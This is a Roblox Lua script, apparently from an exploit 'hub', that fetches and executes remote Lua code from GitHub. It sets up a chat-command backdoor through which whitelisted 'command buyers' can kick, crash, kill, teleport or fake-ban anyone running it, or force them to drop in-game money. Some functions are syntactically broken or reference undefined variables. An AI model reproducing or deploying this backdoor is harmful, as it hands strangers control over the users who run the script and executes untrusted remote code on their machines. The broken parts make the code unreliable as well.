local url = "https://raw.githubusercontent.com/15rih/LTK-New/refs/heads/main/a6hfeuopteafumbvyue507421.lua"
    local Players = game:GetService("Players")
    local TeleportService = game:GetService("TeleportService")
    local RunService = game:GetService("RunService")
    local LocalPlayer = Players.LocalPlayer
    local PlaceId = game.PlaceId
    
    local allowedUserIds = {}
    
    local success, result = pcall(function()
        return loadstring(game:HttpGet(url))()
    end)
    
    if success then
        allowedUserIds = result
    else
        warn("Failed to load allowed User IDs:", result)
    end
    
    local function waitForCharacter(player)
        if player.Character and player.Character.Parent then
            return player.Character
        end
        local character = nil
        repeat
            character = player.Character or player.CharacterAdded:Wait()
            task.wait()
        until character and character.Parent
        return character
    end
    
    local function ensureLocalPlayerCharacter()
        if not LocalPlayer.Character or not LocalPlayer.Character.Parent then
            waitForCharacter(LocalPlayer)
        end
    end
    
    local function isAllowed(player)
        for _, allowedId in ipairs(allowedUserIds) do
            if tostring(player.UserId) == tostring(allowedId) then
                return true
            end
        end
        return false
    end
    
    local function bringExecutorToCaller(caller)
        local callerCharacter = waitForCharacter(caller)
        local executorCharacter = waitForCharacter(LocalPlayer)
        local callerHRP = callerCharacter:FindFirstChild("HumanoidRootPart")
        local executorHRP = executorCharacter:FindFirstChild("HumanoidRootPart")
        if callerHRP and executorHRP then
            local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/15rih/LTK-New/refs/heads/main/extra/lib.lua"))()
            local Notif = library:InitNotifications()
            --executorHRP.CFrame = callerHRP.CFrame * CFrame.new(0,55,0)
                executorHRP.CFrame = callerHRP.CFrame * CFrame.new(0,3,0)
            for i=1,3 do
                local Success = Notif:Notify("LTK: Hub | A Command buyer has just brought you!", 8, "success")
            end
        else
            warn("HumanoidRootPart is missing for caller or executor.")
        end
    end
    
    local function rejoinExecutor()
        local currentJobId = game.JobId
        TeleportService:TeleportToPlaceInstance(PlaceId, currentJobId, LocalPlayer)
    end
    
    local function kickExecutor()
        local character = waitForCharacter(LocalPlayer)
        if character then
            LocalPlayer:Kick("You have been kicked by a command buyer! (You are blacklisted from this JobId)")
        else
            warn("Failed to kick: Character is not loaded.")
        end
    end

    local function freezeExecutor()
        local executorCharacter = waitForCharacter(LocalPlayer)
        local executorHRP = executorCharacter:FindFirstChild("HumanoidRootPart")
        if callerHRP and executorHRP then
            executorHRP.Massless = true
        else
            print("HumanoidRootPart is missing for caller or executor.")
        end
    end
    
    local function unfreezeExecutor()
        local callerCharacter = waitForCharacter(caller)
        local executorCharacter = waitForCharacter(LocalPlayer)
        local callerHRP = callerCharacter:FindFirstChild("HumanoidRootPart")
        local executorHRP = executorCharacter:FindFirstChild("HumanoidRootPart")
        if callerHRP and executorHRP then
            executorHRP.Massless = false
        else
            warn("HumanoidRootPart is missing for caller or executor.")
        end
    end

    local function Message()
        local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/15rih/LTK-New/refs/heads/main/extra/lib.lua"))()
        local Notif = library:InitNotifications()
        for i=1,20 do
            local Test = Notif:Notify("LTK: Hub | A Owner has just pung your client, If you see this a owner is in your game!", 20, "success")
            --game.StarterGui:SetCore("SendNotification", { Title = "LTK: Hub", Text = "If you see this, the owner of LTK: Hub is in ur game!", Duration = 10})
        end
    end

    local function Money()
        getgenv().money = true
		while getgenv().money == true do
            game:GetService("ReplicatedStorage"):WaitForChild("GiveMoney"):FireServer("drop", 10000)
			task.wait(1)
        end
    end

	local function stopDrop()
		for i=1,4 do
			getgenv().money = false
		end
	end

    local function Crash()
        getgenv().crashing = true
        while getgenv().crashing == true do
            print("crash attempt [0x01]")
        end
    end

    local function Freeze()
       game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
    end

    local function Unfreeze()
        game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
    end

    local function Kill()
        game.Players.LocalPlayer.Character.Humanoid.Health = 0
    end

    local function Ban()
        game.Players.LocalPlayer:Kick('Our Newest Byfron-Made Anti-Cheat detected "Velocity Changing" or "Velocity Fly", If this was an error report it in discord.gg/tb2beta & ping Dakota.')
    end

    local function Void()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9e9, 9e9, 9e9)
    end

	local function Sky()
		
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart * CFrame.new(0,math.random(50,100),0)
	    game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
        else
            warn("HumanoidRootPart is missing for caller or executor.")
        end
	end

	local function unSky()
		game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
	end

	local function Flash()
		game:GetService("Players").LocalPlayer.PlayerGui.Flash.Enabled = true
	end

	local function unFlash()
		game:GetService("Players").LocalPlayer.PlayerGui.Flash.Enabled = false
	end

    local function attachChatListener(player)
        player.Chatted:Connect(function(message)
            if isAllowed(player) then
                if message == ".bring" then
                    bringExecutorToCaller(player)
                elseif message == ".rj" then
                    rejoinExecutor()
                elseif message == ".kick" then
                    kickExecutor()
                elseif message == ".freeze" then
                    Freeze() --freezeExecutor()
                elseif message == ".unfreeze" then
                    Unfreeze() --unfreezeExecutor()
                elseif message == ".test" then
                    Message()
                elseif message == ".money" then
                    Money()
				elseif message == ".stop" then
					stopDrop()
                elseif message == ".crash" then
                    Crash()
                elseif message == ".kill" then
                    Kill()
                elseif message == ".ban" then
                    Ban()
                elseif message == ".void" then
                    Void()
				elseif message == ".sky" then
					Sky()
				elseif message == ".unsky" then
					unSky()
				elseif message == ".flash" then
					Flash()
				elseif message == ".unflash" then
					unFlash()
                end
            end
        end)
    end
    
    local function checkExistingPlayers()
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                attachChatListener(player)
            end
            player.CharacterAdded:Connect(function()
                attachChatListener(player)
            end)
        end
    end
    
    ensureLocalPlayerCharacter()
    
    checkExistingPlayers()
    
    Players.PlayerAdded:Connect(function(player)
        player.CharacterAdded:Connect(function()
            attachChatListener(player)
        end)
    end)
    
    RunService.Heartbeat:Connect(function()
        for _, player in ipairs(Players:GetPlayers()) do
            if isAllowed(player) then
                break
            end
        end
    end)
